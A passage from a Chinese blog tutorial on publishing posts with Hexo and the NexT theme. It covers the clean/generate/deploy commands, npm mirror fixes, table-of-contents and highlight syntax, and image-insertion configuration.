主题的配置使用记录</a></p><h2 id="6、发表第一篇博客"><a href="#6、发表第一篇博客" class="headerlink" title="6、发表第一篇博客"></a>6、发表第一篇博客</h2><p>&emsp;&emsp;来吧，发篇博客体验一下，打开你的Typora开始写文咯，这里我将讲述我新建文章的方法</p><p>&emsp;&emsp;[1]、新建一个.md文件，在利用Typora完成编写后，将文件另存到：<span style="background-color: yellow;">hexo next博客文件夹&#x2F;source&#x2F;_posts&#x2F;</span></p><p>&emsp;&emsp;[2]、在博客文件夹下通过cmd命令打开命令行窗口，依次输入以下三行代码，我简称为“三板斧”：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean </span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;通过上述三行代码，你的Hexo博客和GitHub仓库会被更新，写好的md文件也会挂在博客上</p><p>&emsp;&emsp;<span style="background-color: red;">注</span>：在每次修改博客文件夹中内容后，都需运行一遍“三板斧”，才会在博客中生效</p><h2 id="7、可能出现的报错及解决方案"><a href="#7、可能出现的报错及解决方案" class="headerlink" title="7、可能出现的报错及解决方案"></a>7、可能出现的报错及解决方案</h2><p>&emsp;&emsp;来说说我目前在建博客上碰到的壁，满满血泪史(Ｔ▽Ｔ)</p><p>&emsp;&emsp;[1]、在使用npm包管理器下载<span style="background-color: yellow;">hexo-cli</span>时卡住，可尝试两种手段</p><p>&emsp;&emsp;&emsp;①、修改npm源为阿里的镜像源，不使用国外服务器：</p><p>&emsp;&emsp;&emsp;<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p><p>&emsp;&emsp;&emsp;②、未下载依赖：<span style="background-color: yellow;">npm install</span></p><p>&emsp;&emsp;随后重新进行<span style="background-color: yellow;">hexo-cli</span>下载，即重新进行3~[2]，若使用手段①，只需将命令开头的npm改为<span style="background-color: yellow;">cnpm</span></p><p>&emsp;&emsp;[2]、检查自己创建的仓库是不是公开的，即“Public”，若不是，在该步骤会出现问题：4~[12]</p><p>&emsp;&emsp;[3]、一定是根据4~[5]找到“Settings”，而不是在仓库的“Settings”中的“Deploy keys”中操作</p><p>&emsp;&emsp;以下是在写文章时遇到的问题(っ╥╯﹏╰╥c)</p><p>&emsp;&emsp;[4]、如果你想根据标题建立目录，不要使用Typora的一键目录，使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--toc--&gt;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;[5]、不知为何，当使用Markdown文件的高亮语法“&#x3D;&#x3D;高亮内容&#x3D;&#x3D;”时，Hexo上无法显示，这里可以直接使用HTML语法：</p><p>&emsp;&emsp;<code>&lt;span style=&quot;background-color: yellow;&quot;&gt;高亮内容&lt;/span&gt;</code></p><p>&emsp;&emsp;[6]、为了插入图片，我也同样撞了两次壁，查了百度，查了CSDN，找到成功方案，以下使用C++注释风格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//在博客文件夹的_config.yml文件修改</span><br><span class="line">post_asset_folder: true</span><br><span class="line">marked:</span><br><span class="line">  prependRoot: true</span><br><span class="line">  postAsset: true</span><br><span class="line">//在博客文件夹下打开命令行窗口，安装新插件</span><br><span class="line">npm install hexo-asset-img --save</span><br><span class="line">//在/source/_posts/中建立一个同md文件相同名字的文件夹，将图片存放进去</span><br><span class="line">//插入图片的语法必须要求如下(至少咱试了下其他的，都没出来)</span><br><span class="line">！[](图片路径/图片名.图片后缀 &quot;图片名&quot;) // 路径使用相对路径</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;看到这里，肯定有些人没有找到想要的解决方案，没关系，CSDN嘛，总会找到的，期待你的博客！</p><p>&emsp;&emsp;╭（′▽‵）╭（′▽‵）╭（′▽‵）╯</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
